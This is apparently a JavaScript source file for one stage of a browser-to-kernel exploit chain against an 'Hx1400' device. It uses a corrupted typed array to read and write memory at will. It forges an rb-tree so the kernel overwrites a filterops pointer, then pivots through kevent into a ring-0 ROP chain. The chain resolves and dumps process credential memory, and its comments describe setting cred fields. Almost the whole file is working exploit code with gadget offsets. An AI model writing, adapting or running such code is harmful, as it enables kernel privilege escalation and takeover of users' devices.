// Stage F+G (entry 1) for the Hx1400 browser port.
//
// Consumes window.__fw14StageD and window.__fw14KbaseLo (published by
// kbase_wash_v2). Everything happens in one probe because once the
// sysfilt_ops slot is rotated the kernel may call our fake ops at any time;
// leaving it hooked without a live ROP stack is what turns a delay into a
// panic.
//
// F  build a fake 3-node rb-tree whose root's parent is kbase+R_SLOT-8, then
//    ask the kernel to insert one more source. The rebalance performs a right
//    rotation at the fake root and, because the grandparent is not NULL, the
//    kernel writes the middle node's address (fake+0xC00) into
//    *(kbase+R_SLOT). That slot normally holds kbase+R_OPS.
//
// G  turn the middle node into a fake `struct filterops`
//    {isfd=0, attach=ret, detach=ret, event=ret, touch=R_TOUCH}, open a fresh
//    kqueue, build the entry-1 ROP chain at fake+0x1000 and fire one
//    EV_ADD -23. The fake f_touch pivots through the kevent array (whose
//    second event carries R_POPRSP and the chain address) and runs:
//
//      save context -> resolve ucred -> set the capability/cred fields ->
//      write the MARK word -> restore context -> return
//
//    The MARK word at fake+0x1680 proves the chain ran in ring 0 and came
//    back. uid is then read with syscall 24 if the installer published it.
var result, n, f, dv, saved, phase = "preflight";
var st = null, fake = 0, page = 0;
var forged = null, carrier = null, carrierSlot = -1, carrierOriginal = null;
var KBASE_LO = 0;
var R_SLOT = 0x1a312b0, R_RET0 = 0x349ee, R_TOUCH = 0x73e886;
var R_POPRSP = 0x1c9dc, R_SAVE = 0x2be040, R_REST = 0x2be070;
var R_CONT = 0xe4f40, R_PRAX = 0x1ca05, R_PRDX = 0x184ab2;
var R_PRDI = 0x3b0a2a, R_UCRED = 0x31b494, R_RAXRCX = 0x58136;
var R_LDRAX = 0x6aaf3, R_ADDRAX = 0x3fc327, R_STRAXRDX = 0x2e3d59;
var R_STRDIRAX = 0x2f1cb, R_UIDPAIR = 0x42f9f3;
var Z8 = [0, 0, 0, 0, 0, 0, 0, 0];
var MARK = [49, 74, 84, 79, 79, 82, 77, 77];              // 0x4d4d524f4f544a31
var GIDENT = [49, 90, 84, 82, 80, 75, 52, 49];            // 0x31344b5052545a31
var UIDVAL = [19, 0, 0, 0, 0, 0, 1, 72];                  // 0x4801000000000013
var M1 = [255, 255, 255, 255, 255, 255, 255, 255];
var M120 = [136, 255, 255, 255, 255, 255, 255, 255];
var B32 = [0, 0, 0, 0, 1, 0, 0, 0];
try {
  n = window.__fw14NativeInvoke;
  var state = window.__fw14ArrayState;
  if (!n || !n.frame || !n.wrappers || !Number.isSafeInteger(n.frameAddress) ||
      !state || state.array[0] !== state.a || !state.view ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      !Number.isInteger(state.index))
    throw new Error("caller_missing");
  st = window.__fw14StageD;
  if (!st || typeof st.fake !== "number" || typeof st.page !== "number" ||
      typeof st.victimFd !== "number" || !Array.isArray(st.victims) ||
      st.victims.length !== 96)
    throw new Error("stage_d_state_missing");
  KBASE_LO = window.__fw14KbaseLo;
  if (!Number.isInteger(KBASE_LO) || KBASE_LO <= 0 ||
      KBASE_LO > 0xffffffff)
    throw new Error("kbase_missing");
  var need = ["setsockopt", "kevent", "kqueue", "getpid"];
  var missing = [];
  for (var mi = 0; mi < need.length; mi++)
    if (typeof n.wrappers[need[mi]] !== "number") missing.push(need[mi]);
  if (missing.length) throw new Error("wrappers_missing:" + missing.join(","));
  f = n.frame;
  if (f.length < 0x9020) throw new Error("frame_short");
  dv = new DataView(f.buffer, f.byteOffset, f.byteLength);
  saved = Array.from(f.subarray(0x200, 0x1000));

  fake = st.fake;
  page = st.page;

  forged = state.view;
  carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  function bytesAt(index, count) {
    var out = [];
    for (var i = 0; i < count; i++) out.push(forged[index + i]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var i = bytes.length - 1; i >= 0; i--)
      value = value * 256 + bytes[i];
    return value;
  }
  function pointerBytes(value) {
    var out = [];
    for (var i = 0; i < 8; i++)
      out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  carrierOriginal = bytesAt(carrierSlot, 8);
  function setCarrier(addr) {
    var next = pointerBytes(addr);
    for (var i = 0; i < 8; i++) forged[carrierSlot + i] = next[i];
  }
  function restoreCarrier() {
    for (var i = 0; i < 8; i++)
      forged[carrierSlot + i] = carrierOriginal[i];
  }
  function poke(addr, bytes) {
    setCarrier(addr);
    for (var i = 0; i < bytes.length; i++) carrier[i] = bytes[i];
    restoreCarrier();
  }
  function peek(addr, count) {
    setCarrier(addr);
    var out = [];
    for (var i = 0; i < count; i++) out.push(carrier[i]);
    restoreCarrier();
    return out;
  }
  function pokeQ(addr, bytes) { poke(addr, bytes); }
  function peekQ(addr) { return peek(addr, 8); }
  function pokeU32(addr, value) {
    poke(addr, [value & 255, (value >>> 8) & 255,
                (value >>> 16) & 255, (value >>> 24) & 255]);
  }
  function same(left, right) {
    if (!left || !right || left.length !== right.length) return false;
    for (var i = 0; i < left.length; i++)
      if (left[i] !== (right[i] & 255)) return false;
    return true;
  }
  function eq(addr, bytes) { return same(peek(addr, bytes.length), bytes); }
  function kptr(bytes) {
    if (bytes[7] !== 0xff || bytes[6] !== 0xff) return false;
    return (bytes[0] | bytes[1] | bytes[2] |
            bytes[3] | bytes[4] | bytes[5]) !== 0;
  }
  function zero(addr, len) { poke(addr, new Uint8Array(len)); }
  function kq(rva) {
    var lo = KBASE_LO + rva;
    if (lo > 0xffffffff) throw new Error("kva_overflow_" + rva);
    return [lo & 255, (lo >>> 8) & 255, (lo >>> 16) & 255,
            (lo >>> 24) & 255, 0xff, 0xff, 0xff, 0xff];
  }
  function u64b(value) { return pointerBytes(value); }
  function isErr(r) {
    return !!r && r.value === -1 && (r.high >>> 0) === 0xffffffff;
  }
  function eTag(r) {
    if (!isErr(r)) return "v" + r.value;
    var e = n.readErrno();
    return "e" + (e === null ? r.value : e);
  }
  function hex8(v) { return ("00000000" + (v >>> 0).toString(16)).slice(-8); }
  function node(addr, left, right, parent, color, key) {
    poke(addr, left);
    poke(addr + 8, right);
    poke(addr + 16, parent);
    pokeU32(addr + 24, color);
    pokeU32(addr + 32, key >>> 0);
    poke(addr + 36, [1]);
    poke(addr + 37, [1]);
  }

  var pidRes = n.call("getpid", []);
  if (pidRes.high !== 0 || pidRes.value < 1 || pidRes.value > 100000)
    throw new Error("pid_invalid");
  var pid = pidRes.value;

  // ================================================== F: rotate fake ops
  phase = "f_build";
  var A = kq(R_SLOT - 8);          // kbase + R_SLOT - 8
  var l111 = fake + 2304;          // 0x900  old root
  var l112 = fake + 3072;          // 0xC00  new fake ops + new left child
  var l113 = fake + 3328;          // 0xD00  old right child
  zero(l111, 48);
  zero(l112, 48);
  zero(l113, 48);
  node(l111, u64b(l112), u64b(l113), A, 0, -1);
  node(l112, Z8, Z8, u64b(l111), 1, -2);
  node(l113, Z8, Z8, Z8, 0, -3);
  pokeQ(fake + 80, u64b(l111));
  pokeQ(fake + 88, u64b(3));

  f.fill(0, 0x640, 0x660);
  f[0x640] = 0xef; f[0x641] = 0xff; f[0x642] = 0xff; f[0x643] = 0xf9;
  f[0x644] = 0xc0; f[0x645] = 0x00; f[0x646] = 0x02; f[0x647] = 0x03;

  phase = "f_rotate";
  var rc = n.call("setsockopt",
    [st.victimFd, 0, 72, n.frameAddress + 0x640, 12, 0]);

  var gate = rc.value === 0 &&
    eq(fake + 80, u64b(l111)) &&
    eq(fake + 88, u64b(4)) &&
    eq(l111, Z8) &&
    eq(l111 + 8, u64b(l113)) &&
    eq(l111 + 16, u64b(l112)) &&
    eq(l112 + 8, u64b(l111)) &&
    eq(l113 + 16, Z8) &&
    kptr(peekQ(l112));
  var rotateTag = "rc=" + eTag(rc) +
    "/root=" + hex8(valueOf(peekQ(fake + 80))) +
    "/n=" + hex8(valueOf(peekQ(fake + 88))) +
    "/P=" + hex8(valueOf(peekQ(l111 + 16))) +
    "/L=" + hex8(valueOf(peekQ(l112)));

  if (!gate) {
    // Disarm the fake tree before returning: an armed tree with no live
    // ROP stack is what makes a delayed walk fatal.
    pokeU32(fake + 56, 0x40000000);
    pokeQ(fake + 80, Z8);
    pokeQ(fake + 88, Z8);
    zero(fake + 2304, 96);
    zero(fake + 2560, 96);
    result = {
      id: "stage_fg_probe_v1",
      status: "fail",
      details: {
        pid: pid,
        rotate: rotateTag,
        state: "disarmed",
        intact: n.call("getpid", []).value === pid
      }
    };
  } else {
    // ------------------------------------------- fake filterops at l112
    phase = "f_ops";
    pokeQ(l112, Z8);              // f_isfd = 0
    pokeQ(l112 + 8, kq(R_RET0));  // f_attach
    pokeQ(l112 + 16, kq(R_RET0)); // f_detach
    pokeQ(l112 + 24, kq(R_RET0)); // f_event
    pokeQ(l112 + 32, kq(R_TOUCH));// f_touch
    var opsOk = eq(l112, Z8) &&
      eq(l112 + 8, kq(R_RET0)) &&
      eq(l112 + 32, kq(R_TOUCH));

    // ---------------------------------------------------- root kqueue
    phase = "g_kqueue";
    var kqRes = n.call("kqueue", []);
    var kqFd = kqRes.value;
    if (opsOk && kqFd < 0) throw new Error("kqueue" + eTag(kqRes));

    // Hx1400 registers the knote before it pivots: EV_ADD -23 with nchanges=1
    // calls f_attach (R_RET0) on the hooked slot and creates the knote. The
    // 2-change fire below then takes the f_touch path. Without this the first
    // change is a fresh registration and the second (garbage) event makes the
    // syscall return EINVAL without ever pivoting.
    phase = "g_add";
    f.fill(0, 0x900, 0x940);
    for (var gi0 = 0; gi0 < 8; gi0++) f[0x900 + gi0] = GIDENT[gi0];
    dv.setInt16(0x908, -23, true);
    dv.setUint16(0x90a, 1, true);
    var addRes = n.call("kevent",
      [kqFd, n.frameAddress + 0x900, 1, 0, 0, 0]);

    // ------------------------------------------------ diagnostic chains
    var gSTACK = fake + 4096;     // 0x1000
    var gRES = fake + 5632;       // 0x1600
    var gMARK = fake + 5760;      // 0x1680
    var gCTX = fake + 5888;       // 0x1700
    var gDUMP = fake + 6400;      // 0x1900

    function mark(m) {
      if (typeof api !== "undefined" && api && typeof api.markSync === "function")
        api.markSync(m);
    }

    function isBytes(v) { return v && typeof v === "object" && v.length === 8; }
    function addBytes(bytes, delta) {
      var out = bytes.slice(0), carry = delta;
      for (var i = 0; i < 8 && carry > 0; i++) {
        var v = out[i] + (carry % 256);
        out[i] = v & 255;
        carry = Math.floor(carry / 256) + (v >> 8);
      }
      return out;
    }
    function hex16(bytes) {
      var out = "";
      for (var i = 7; i >= 0; i--)
        out += ("0" + (bytes[i] & 255).toString(16)).slice(-2);
      return out;
    }
    function isKptr(bytes) {
      return bytes[7] === 0xff && bytes[6] === 0xff &&
        (bytes[0] | bytes[1] | bytes[2] | bytes[3] |
         bytes[4] | bytes[5]) !== 0;
    }

    function buildChain(kind, a1, a2) {
      var chain = [];
      function emit(b) { chain.push(b); }
      function emitU(v) { emit(isBytes(v) ? v : u64b(v)); }
      function kb1() {
        emit(kq(R_PRAX)); emit(MARK);
        emit(kq(R_PRDI)); emitU(gMARK);
        emit(kq(R_STRDIRAX)); emitU(0);
        emit(kq(R_PRAX)); emitU(gCTX + 16);
        emit(kq(R_LDRAX)); emitU(0);
        emit(kq(R_PRDX)); emit(M120);
        emit(kq(R_ADDRAX)); emitU(0);
        emit(kq(R_PRDI)); emitU(gCTX + 8);
        emit(kq(R_STRDIRAX)); emitU(0);
        emit(kq(R_PRAX)); emit(kq(R_CONT));
        emit(kq(R_PRDI)); emitU(gCTX + 56);
        emit(kq(R_STRDIRAX)); emitU(0);
        emit(kq(R_PRDI)); emitU(gCTX);
        emit(kq(R_REST));
      }
      emit(kq(R_PRDI)); emitU(gCTX); emit(kq(R_SAVE));
      if (kind === "ucred") {
        emit(kq(R_UCRED)); emitU(0);
        emit(kq(R_PRDI)); emitU(gRES); emit(kq(R_STRDIRAX)); emitU(0);
      } else if (kind === "store") {
        // rax = rcx = target so the store lands in our page whether the
        // gadget uses rax or rcx
        emit(kq(R_PRAX)); emitU(a1);
        emit(kq(R_RAXRCX)); emitU(0);
        emit(kq(R_PRDX)); emitU(a2);
        emit(kq(R_STRAXRDX)); emitU(0);
      } else if (kind === "read") {
        emit(kq(R_PRAX)); emitU(a1);
        emit(kq(R_LDRAX)); emitU(0);
        emit(kq(R_PRDI)); emitU(a2);
        emit(kq(R_STRDIRAX)); emitU(0);
      }
      kb1();
      var bytes = [];
      for (var qi = 0; qi < chain.length; qi++)
        for (var bi = 0; bi < 8; bi++) bytes.push(chain[qi][bi]);
      if (chain.length > 112) throw new Error("chain_long_" + chain.length);
      return { bytes: bytes, qwords: chain.length };
    }

    function fireChain(kind, a1, a2) {
      var built = buildChain(kind, a1, a2);
      poke(gSTACK, built.bytes);
      pokeQ(gMARK, Z8);
      f.fill(0, 0x900, 0x940);
      for (var gi3 = 0; gi3 < 8; gi3++) f[0x900 + gi3] = GIDENT[gi3];
      dv.setInt16(0x908, -23, true);
      dv.setUint16(0x90a, 1, true);
      var poprsp = kq(R_POPRSP);
      for (var pi2 = 0; pi2 < 8; pi2++) f[0x920 + pi2] = poprsp[pi2];
      var stackB = u64b(gSTACK);
      for (var si2 = 0; si2 < 8; si2++) f[0x928 + si2] = stackB[si2];
      var rc = n.call("kevent", [kqFd, n.frameAddress + 0x900, 2, 0, 0, 0]);
      return { rc: rc, mark: same(peekQ(gMARK), MARK), qwords: built.qwords };
    }

    var marks = [];

    // A: pivot check (the chain that already worked live)
    phase = "p_marker";
    mark("fgp_a");
    var aRes = fireChain("none");
    marks.push(aRes.mark ? "a1" : "a0");

    // B: resolve the current ucred into rax and store it at gRES
    var ucredBytes = Z8, ucredOk = false, bRes = null;
    if (aRes.mark) {
      phase = "p_ucred";
      mark("fgp_b");
      bRes = fireChain("ucred");
      ucredBytes = peekQ(gRES);
      ucredOk = bRes.mark && isKptr(ucredBytes);
      marks.push(bRes.mark ? "b1" : "b0");
      marks.push(ucredOk ? "k" : "nk");
    }

    // C: store MARK into our own page with rax = rcx = gRES+8
    var storeOk = false, cRes = null, storeTag = "-";
    if (ucredOk) {
      phase = "p_store";
      mark("fgp_c");
      cRes = fireChain("store", gRES + 8, MARK);
      storeOk = cRes.mark && same(peekQ(gRES + 8), MARK);
      marks.push(cRes.mark ? "c1" : "c0");
      marks.push(storeOk ? "s1" : "s0");
      storeTag = hex16(peekQ(gRES + 8));
    }

    // D: dump 16 qwords of the ucred
    var dump = [], dumpTag = "-";
    if (ucredOk) {
      phase = "p_read";
      mark("fgp_d");
      for (var di = 0; di < 16; di++) {
        var src = addBytes(ucredBytes, di * 8);
        var dst = gDUMP + di * 8;
        var rRes = fireChain("read", src, dst);
        if (!rRes.mark) { dumpTag = "dead@" + di; break; }
        dump.push(hex16(peekQ(dst)));
      }
      if (dumpTag === "-") dumpTag = "ok";
    }

    // ------------------------------------------------------- outcome
    phase = "outcome";
    for (var ri2 = 0; ri2 < saved.length; ri2++) f[0x200 + ri2] = saved[ri2];
    saved = null;
    var post2 = n.call("getpid", []);
    var intact2 = post2.value === pid && post2.high === 0 &&
      state.array[0] === state.a &&
      bytesAt(carrierSlot, 8).join(",") === carrierOriginal.join(",");

    window.__fw14StageF = {
      fake: fake, page: page, ops: l112, kq: kqFd,
      gSTACK: gSTACK, gRES: gRES, gMARK: gMARK, gCTX: gCTX, gDUMP: gDUMP,
      ucred: ucredOk ? ucredBytes.slice() : null,
      kbaseLo: KBASE_LO, pid: pid,
      victimFd: st.victimFd, victims: st.victims.slice(), anchor: st.anchor
    };
    result = {
      id: "stage_fg_probe_v1",
      status: (aRes.mark && ucredOk && storeOk && dumpTag === "ok" && intact2)
        ? "pass" : "fail",
      details: {
        pid: pid,
        rotate: rotateTag,
        ops: (opsOk ? "ok" : "bad") + "/kq" + kqFd + "/add" + eTag(addRes),
        marks: marks.join("/"),
        ucred: ucredOk ? hex16(ucredBytes) : "none",
        store: storeTag,
        read: dumpTag,
        dump: dump.join(",").slice(0, 480),
        state: aRes.mark ? "ring0" : "dead",
        intact: intact2
      }
    };
  }
} catch (e) {
  result = {
    id: "stage_fg_probe_v1",
    status: "error",
    details: { phase: phase, error: String(e).slice(0, 220) }
  };
} finally {
  try { if (forged && carrierSlot >= 0 && carrierOriginal)
    for (var ci = 0; ci < 8; ci++)
      forged[carrierSlot + ci] = carrierOriginal[ci]; } catch (ignore) {}
  if (f && saved)
    for (var fi = 0; fi < saved.length; fi++) f[0x200 + fi] = saved[fi];
}
return [result];
